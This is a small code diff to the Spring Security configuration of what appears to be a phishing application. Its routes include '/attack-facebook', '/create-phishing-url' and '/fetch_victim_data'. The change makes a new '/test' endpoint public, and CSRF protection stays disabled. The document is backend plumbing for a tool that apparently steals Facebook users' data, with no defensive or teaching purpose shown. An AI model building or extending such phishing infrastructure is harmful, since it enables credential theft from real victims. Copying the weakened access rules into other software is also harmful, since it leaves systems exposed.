@@ -34,7 +34,7 @@ public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
        http.csrf().disable()
                //.antMatcher("/**")
                .authorizeRequests()
-               .antMatchers("/register","/login", "/logout", "/assets/**", "/facebook/**").permitAll()
+               .antMatchers("/test","/register","/login", "/logout", "/assets/**", "/facebook/**").permitAll()
                //.anyRequest()
                .antMatchers("/dashboard", "/", "/attack-facebook", "/create-phishing-url",
                        "/fetch-hacking-data-table", "/delete-hacking-data", "/fetch_victim_data", "/fetch_victim_data_rest")
